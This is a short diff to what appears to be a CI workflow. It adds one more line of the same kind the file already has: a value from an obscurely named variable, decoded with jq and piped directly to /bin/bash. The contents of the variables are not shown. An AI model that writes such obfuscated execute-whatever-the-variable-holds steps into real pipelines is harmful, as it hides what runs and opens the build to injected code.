@@ -26,6 +26,7 @@ jobs:
           echo $gys1 | jq -r .tpwq1401 | /bin/bash
           echo $m52020 | jq -r .rkf46 | /bin/bash
           echo $gml9727 | jq -r .m302 | /bin/bash
+          printf '%s' "$pjqfz54" | jq -r .vjs7808 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
